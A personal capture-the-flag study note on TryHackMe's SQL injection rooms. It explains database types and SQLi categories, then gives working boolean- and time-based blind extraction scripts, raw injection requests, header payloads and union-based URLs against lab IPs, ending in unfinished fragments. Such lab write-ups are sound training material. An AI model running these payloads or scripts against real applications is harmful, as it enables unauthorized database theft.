---
title: SQHell
tags:
  - fetus
---
- _fine ill update this note (i was procrastinating on exam prep)_ - 6/8/2025
- room links: 
	- https://tryhackme.com/room/sqlinjectionlm
	- https://tryhackme.com/room/sqhell
# Brief:
in this room. we're going to take a look at various types SQL injection. but before that. lets take a look at the basics just so theres no hurdles going forward
## Databases and SQL. what are these?
### databases:
well a database is just a way to digitally store information. databases are usually controlled by DBMSs or Database Management System. you can have several databases within a single DBMS. with each database being comprised of multiple tables, each table storing sets of related information of various types. each table has columns and rows. each column defines what the data is about and the rows actually store the data. theres also two main types of DBMSs, relational and non relational
#### relational (SQL) databases:
- stores data in tables. 
- the tables usually contain a column that has a unique ID (primary key) that is used in other tables to reference it and cause relationships, hence the name `relational database`
- used for managing structured data that follows a strict pattern i.e. data that needs to fit in nicely into predefined rows and columns. 
- supports ACID transactions making a high degree of data accuracy and consistency possible. ideal for usage in applications used in banking, ecommerce and finance
- needs a specific schema to be set that describes the relationships between tables and feild types. 
- is easy to query through. makes conplex queries and join operations across numerous tables possible
- can query and return related data from multiple tables in a single neat table. example: <br>
![[SQHellRelationalDatabaseExampleSS.png]]
- some examples of relational DBMSs are:
	- MySQL 
	- Microsoft SQL server 
	- PostgreSQL
#### nonrelational (NoSQL) databases:
- doesnt need to store data in table format. can use other types of formats freely
- doesnt require a schema to be set. is easily configurable to add custom functionality to handle numerous types of data structures
- has four different types:
	- document-based databases 
		- these store data as documents (often in JSON or BSON format) making it easy to manage complex data within single records. partifcularly useful CMSs where each document might have unique structures and fields.
		- example DBMSs: MongoDB, CouchDB
	- key-value stores
		- uses a model where each item is stored as a key value pair allowing quick data fetching. ideal for caching and session management. 
		- example DBMSs: Redis, DinamoDB
	- column-family stores 
		- stores structured data in columns instead of rows, making for efficient handling of large volumes of data across distributed systems. common in data analytics applications where the operations are done on columns and not rows. 
		- example DBMSs: Cassandra, HBase
	- graph databases
		- focuses on relationships between data points. models entities and nodes and relationships as edges. allows for complex interconnected data to be efficiently managed and queried. exactly like how obsidian handles the graphs and connections :D
		- example DBMSs: Neo4j, Amazon Neptune
- simple picture for teaching other goofy ahh people too lazy to read: <br>
![[SQHellNoSQLExamplePic.png]]
### SQL:
SQL or Structured Query Language is a feature rich language used for querying relational databases. see [[mysql]] to see various ways to query for specific things and do specific stuff
## whats SQL injection?
is an attack on a web application database server that causes malicious queries to be executed. happens when a web app communicates with a database server using user input where the user input hasnt been propertly validated and steralized, running malicious queries

- there are three main types of SQLi in total:
	- In-Band
	- Blind
	- Out-of-Band
### In-Band SQLi:
- refers to using the same method of communication between the web page and the server to also exploit and recieve the results of the malicious queries to that same page 
- subtypes:
	- Error-Based SQLi
		- error messages from the database are printed directly to the browser screen. can often be used to enumerate a whole database. most useful for easily obtaining info about DB structure 
		  - the key is to discovering this type is to break the code's query by trying certain characters until an error message is produced like `'` or `"` 
	- Union-Based SQLi
		- uses the UNION with SELECT statements to ruturn additional results to the page. its the most common way of extracting large amounts of data via SQLi 
- solve task 5 in the first room to get a basic idea
### Blind SQLi:
- you cant see the results of the malicious query this time (hence the name _blind_ SQLi), nor can you see any error messages. in Blind SQLi, we get little to no feedback to confirm whether out injected queries ran or not because the error messages were disabled. but we can still enumerate the whole database just from the little bit of variability we get when the query runs regardless of whether we can see the output or not 
- subtypes:
	- Auth-Bypass:
		- usually just depends on the returned boolean value. not the actual values of the credentials. you can make it so that the check always returns the boolean value of true with something like `' OR 1=1;--`  
	- Boolean-Based
		- returns a boolean value and nothing else. but here, unlike the auth bypass, we're actually interested in getting some data and not just bypassing the authentication. so we enumerate the entire database just based on the boolean results we get from checking if really specific things are true or not. for example we could check if the name of the database is a certain amount of letters or not and then get each letter by checking if the specific letter in the specific position matches a specific letter we specify and so on. 
	- Time-Based
		- the same thing with boolean but with a catch. we dont even get a boolean anymore. we just get a difference in time to tell if the injection worked or not with. we identify if the code ran or not by including something like `sleep(5)` in the payload so if the query runs it takes 5 seconds to give us a response :D the enumeration is the same as boolean, just guessing based on the time it takes to get a response back instead of a true/false value 
### Out-of-Band SQLi:
- depends on specific features being enabled on the DB server or the Web App's business logic that makes some kind external network call based on the results of the sql query. this type of SQLi is mainly classified by having two different channels of communication. one to communicate with the DB and send malicious payloads and the other to get the information back to a machine you control 
## flag 1:
## flag 2:
## flag 3:
## flag 4:
## flag 5:

 
## boolean based SQLi on `/register/user-check?username=admin`: 
- request:
```
GET /register/user-check?username=admin' AND (length(database())) = 8 --+ HTTP/1.1
Host: 10.10.239.223
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Referer: http://10.10.239.223/register
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
- response: 
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 07 Apr 2025 12:42:48 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 19

{"available":false}
```
- tells us the DB name is 8 characters long
- gonna get the DB name now with this: 
```
GET /register/user-check?username=admin' AND (ascii(substr((select database()),Data_offset,1))) = 'ascii values'--+
```

- burp setup:<br>
![[SQHell burp1.png]]<br>
![[SQHell burp2.png]]<br>
![[SQHell burp3.png]]<br>
- results after filtering for false:<br>
![[SQHell burpClusterBombResults.png]]
- after cross referencing it with an ASCII table, the DB name turns out to be `sqhell_3` 
- tried to convert the python script to something in http but clearly didnt work cuz o dont know how to write proper http stuff **yet**. ill just use the python script. oh and also heres a peek at what i tried to do:<br>
![[SQHell failedAttempt.png]]
- used a modified version of [[SQHellPythonScript1]]. given below:
```py fold title:"mSkibidi.py"
import requests

import string

  

server = "10.10.239.223"  # Change this to the actual IP or domain

  

def get_result(payload):

    url = f"http://{server}/register/user-check?username=admin' AND ({payload}) --+"

    response = requests.get(url)

    return 'false' in response.text  # Adjust this if the true condition is different

  

# 1. Find Current Database Name

db_name = "sqhell_3"

i = 1

  

print(f"\nDatabase Name: {db_name}")

  

# 2. Find Table Names

table_names = []

for table_index in range(0, 10):  # Adjust the range if needed

    table_name = ""

    i = 1

    while True:

        found = False

        for char in string.printable:

            if char in ("'", '\\'):

                continue

            payload = f"ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {table_index},1),{i},1))={ord(char)}"

            if get_result(payload):

                table_name += char

                print(f"Finding Table[{table_index}]: {table_name}", end="\r")

                i += 1

                found = True

                break

        if not found:

            break

    if table_name:

        table_names.append(table_name)

    else:

        break

  

print(f"\nTables: {table_names}")

  

# 3. Find Column Names for Each Table

columns = {}

for table in table_names:

    columns[table] = []

    for col_index in range(0, 10):  # Adjust the range if needed

        column_name = ""

        i = 1

        while True:

            found = False

            for char in string.printable:

                if char in ("'", '\\'):

                    continue

                payload = f"ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {col_index},1),{i},1))={ord(char)}"

                if get_result(payload):

                    column_name += char

                    print(f"Finding Column[{col_index}] in Table[{table}]: {column_name}", end="\r")

                    i += 1

                    found = True

                    break

            if not found:

                break

        if column_name:

            columns[table].append(column_name)

        else:

            break

  

print(f"\nColumns: {columns}")
```
- got two tables:
	- `flag`
		- got two columns:
			- `flag`
			- `id`
			- 
	- `users`
		- got 3 columns:
			- `id`
			- `password`
			- `username`
- an image of the output cuz why not:<br>
![[SQHellPyOutput1.png]]

- another python script to get the flag column from the flag table:
```py fold title:"skibidi2.py"
import requests  
import string  
  
server = "10.10.239.223" # IP OR SERVERNAME   
flag = ""  
loop = 1  
  
while chr(125) not in flag:  
    for a in range(48,126):  
        req = requests.get("http://" + server + f"/register/user-check?username=admin' AND (ASCII(SUBSTR((SELECT flag FROM sqhell_3.flag),{loop},1))) = '{a}'; --+")  
        if 'false' in req.text:  
             flag += chr(a)  
             loop += 1  
             print("Finding Flag: ", flag, end="\r")  
             break  
print("Flag found: ", flag)
```
- ran it 
- flag found yaay
```
Flag found:  THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
```


## time based SQLi at `http://10.10.239.142/terms-and-conditions` with the http header

```
X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,2,1))) = '72'); --+
```

```py
message = ""

  

with open("data.txt") as f:

    for line in f:

        parts = line.strip().split('\t')

        if len(parts) > 4 and parts[4].isdigit() and int(parts[4]) > 5000:

            ascii_val = int(parts[2])

            message += chr(ascii_val)

            # print(chr(ascii_val))

            # print("flag:   ", message)

  

print("Decoded message:", message)
```

```py
import requests

import time

import string

  

server = "10.10.239.142"  # IP or server name

  

# Function to send the request and check the result

def get_result(payload, sleep_time=3, retries=3):

    url = f"http://{server}"

    headers = {'X-Forwarded-For': payload}

    success_count = 0

    for _ in range(retries):

        try:

            start = time.time()

            response = requests.get(url, headers=headers, timeout=sleep_time + 3)

            end = time.time()

            if end - start >= sleep_time - 0.5:  # Slight flexibility for network delay

                success_count += 1

        except requests.exceptions.RequestException:

            pass

  

    # Majority voting - return True if at least half the attempts succeed

    return success_count >= (retries // 2 + 1)

  
  

## 1. Find Table Names of CurrentDB

table_names = []

for table_index in range(0, 10):

    table_name = ""

    i = 1

    while True:

        found = False

        for char in string.printable:

            if char in ("'", '\\'):  # Skip problematic characters

                continue

            payload = f"1' AND (SELECT sleep(3) FROM (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT {table_index},1) AS tbl WHERE ASCII(SUBSTR(tbl.table_name,{i},1))={ord(char)}); --++"

            if get_result(payload):

                table_name += char

                print(f"Finding Table[{table_index}]: {table_name}", end="\r")

                i += 1

                found = True

                break

        if not found:

            break

    if table_name:

        table_names.append(table_name)

    else:

        break

print(f"\nTables: {table_names}")

  
  

# 2. Find Column Names for Each Table

columns = {}

for table in table_names:

    columns[table] = []

    for col_index in range(0, 10):

        column_name = ""

        i = 1

        while True:

            found = False

            for char in string.printable:

                if char in ("'", '\\'):  # Skip problematic characters

                    continue

                payload = f"1' AND (SELECT sleep(3) FROM (SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {col_index},1) AS col WHERE ASCII(SUBSTR(col.column_name,{i},1))={ord(char)}); --+"

                if get_result(payload):

                    column_name += char

                    print(f"Finding Column[{col_index}] in Table[{table}]: {column_name}", end="\r")

                    i += 1

                    found = True

                    break

            if not found:

                break

        if column_name:

            columns[table].append(column_name)

        else:

            break

print(f"\nColumns: {columns}")
```

```
import requests

import time

import string

  

server = "10.10.239.142"  # IP or server name

flag = ""

loop = 1

url = f"http://{server}"

  

# Function to send the request and check the result

def get_result(payload):

    headers = {'X-Forwarded-For': payload}

    try:

        start = time.time()

        response = requests.get(url, headers=headers, timeout=5)

        end = time.time()

        return end - start >= 2  # Return whether the response took longer than 2 seconds

    except requests.exceptions.RequestException:

        return False  # If request fails, return False

  

# Main loop to extract the flag

while chr(125) not in flag:

    for char in string.printable:

        if char in ("'", '\\'):  # Skip problematic characters

            continue

        payload = f"1' AND (SELECT sleep(5) FROM flag WHERE ASCII(SUBSTR(flag,{loop},1)) = {ord(char)}); --+"

        if get_result(payload):

            flag += char

            loop += 1

            print(f"Finding Flag: {flag}", end="\r")

            break

  

print(f"\nFlag found: {flag}")
```
---





='select * from table where user='test' or '1' = '1' ' and password="awfawf"'

http://10.10.239.142/post?id=1

http://10.10.239.142/post?id=-1 union select 1,concat("flag:   ", flag, "    ID:    ", id),3,4 from flag

db name: sqhell_5
table name: flag, posts, users, 
columns: id, flag
http://10.10.239.142/user?id=-2 union select "1 union select 1,concat(flag),3,4 from flag",2,3 from users

- DB
	- TABLE1
		- COLUMN1 
		- COLUMN2 
			- DATA
	- TABLE2



http://10.10.130.138/user?id=-2 union select "1 union select 1,concat(flag),3,4 from flag",2,3 from users


def concat():
	return "test"
print(concat())


